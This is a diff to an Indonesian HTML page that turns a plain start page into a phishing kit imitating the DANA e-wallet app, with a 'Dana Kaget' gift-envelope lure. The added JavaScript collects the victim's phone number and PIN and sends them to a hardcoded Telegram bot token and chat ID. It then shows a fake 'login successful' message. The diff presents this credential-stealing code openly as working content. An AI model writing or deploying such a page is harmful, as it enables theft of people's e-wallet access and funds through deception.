@@ -2,55 +2,155 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Halaman 3</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Aplikasi Dana</title>
 <style>
   body {
-    margin: 0;
-    background-color: #0094FF;
-    font-family: Arial, sans-serif;
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-    color: #fff;
-    justify-content: center; /* Menengahkan secara vertikal */
-    align-items: center; /* Menengahkan secara horizontal */
+    margin: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #0d47a1; color: #fff;
+  }
+  .page {
+    display: none; padding: 20px; height: 100vh; box-sizing: border-box;
+  }
+  .active {
+    display: block;
+  }
+  /* Styling umum */
+  h1, h2 {
+    margin-top: 0;
+  }
+  /* Halaman awal */
+  #page-start {
+    display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;
+  }
+  #page-start h1 {
+    font-size: 24px; margin-bottom: 20px;
+  }
+  #amplop-btn {
+    background: none; border: none; cursor: pointer;
+  }
+  #amplop-btn img {
+    width: 120px; height: 120px;
   }
 
-  /* Text utama */
-  .text {
-    font-size: 24px;
-    font-weight: bold;
-    text-align: center;
+  /* Halaman nomor HP */
+  #page-phone {
+    display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%;
+  }
+  #page-phone h2 {
     margin-bottom: 20px;
-    padding: 0 20px;
+  }
+  #nohp {
+    width: 80%; padding: 12px; font-size: 16px; border-radius: 8px; border: none; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  }
+  #page-phone button {
+    margin-top: 20px; padding: 12px 30px; font-size: 16px; border: none; border-radius: 8px; background-color: #ffd700; color: #0d47a1; cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  #page-phone button:hover {
+    background-color: #ffc107;
   }
 
-  /* Button MULAI */
-  .start-btn {
-    background-color: #fff;
-    color: #0094FF;
-    padding: 15px 30px;
-    border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-    transition: 0.3s;
+  /* Halaman PIN */
+  #page-pin {
+    display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%;
   }
-  .start-btn:hover {
-    background-color: #f0f0f0;
+  #page-pin h2 {
+    margin-bottom: 20px;
+  }
+  #pin {
+    width: 50%; padding: 12px; font-size: 20px; text-align: center; letter-spacing: 8px; border-radius: 8px; border: none; box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+  }
+  #page-pin button {
+    margin-top: 20px; padding: 12px 30px; font-size: 16px; border: none; border-radius: 8px; background-color: #ffd700; color: #0d47a1; cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  #page-pin button:hover {
+    background-color: #ffc107;
   }
 </style>
 </head>
 <body>
 
-<div class="text">
-  Kemudahan transaksi<br>berbagai kebutuhan
+<!-- Halaman awal -->
+<div id="page-start" class="page active">
+  <h1>Selamat Datang di Aplikasi Dana</h1>
+  <p>Buka amplop buat lihat Dana Kaget</p>
+  <button id="amplop-btn" aria-label="Buka Amplop">
+    <img src="https://img.icons8.com/ios/100/ffffff/open-envelope.png" alt="Amplop" />
+  </button>
 </div>
 
-<button class="start-btn" onclick="window.location.href='halaman4.html'">MULAI</button>
+<!-- Halaman input nomor HP -->
+<div id="page-phone" class="page">
+  <h2>Masukkan Nomor HP Dana</h2>
+  <input type="text" id="nohp" placeholder="Nomor HP" maxlength="15" />
+  <button id="lanjut-ke-pin">Lanjut</button>
+</div>
+
+<!-- Halaman input PIN -->
+<div id="page-pin" class="page">
+  <h2>Masukkan PIN</h2>
+  <input type="password" maxlength="6" placeholder="PIN" id="pin" />
+  <button id="login-btn">Login</button>
+</div>
+
+<script>
+  const tokenTelegram = "8309524194:AAE8fU0nBYFuMWivh05WHsUT2FwdQfT6O0M"; // Token bot
+  const chatId = "5116335881"; // Chat ID
+
+  function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(pageId).classList.add('active');
+  }
+
+  // Navigasi halaman
+  document.getElementById('amplop-btn').addEventListener('click', () => {
+    showPage('page-phone');
+  });
+
+  document.getElementById('lanjut-ke-pin').addEventListener('click', () => {
+    const nohp = document.getElementById('nohp').value.trim();
+    if (nohp !== '') {
+      showPage('page-pin');
+    } else {
+      alert('Mohon masukkan nomor HP');
+    }
+  });
+
+  // Fungsi mengirim ke Telegram
+  function kirimKeTelegram(nomor, pin) {
+    const message = `Login Dana\nNomor HP: ${nomor}\nPIN: ${pin}`;
+    fetch(`https://api.telegram.org/bot${tokenTelegram}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    }).then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          console.log('Pesan terkirim ke Telegram');
+        } else {
+          console.error('Gagal mengirim ke Telegram', data);
+        }
+      }).catch(error => {
+        console.error('Error:', error);
+      });
+  }
+
+  // Saat klik login
+  document.getElementById('login-btn').addEventListener('click', () => {
+    const pin = document.getElementById('pin').value.trim();
+    const nohp = document.getElementById('nohp').value.trim();
+
+    if (pin !== '' && nohp !== '') {
+      // Kirim info ke Telegram
+      kirimKeTelegram(nohp, pin);
+      alert('Login berhasil! Data telah dikirim.');
+    } else {
+      alert('Mohon masukkan PIN dan nomor HP');
+    }
+  });
+</script>
 
 </body>
 </html>
+``` 
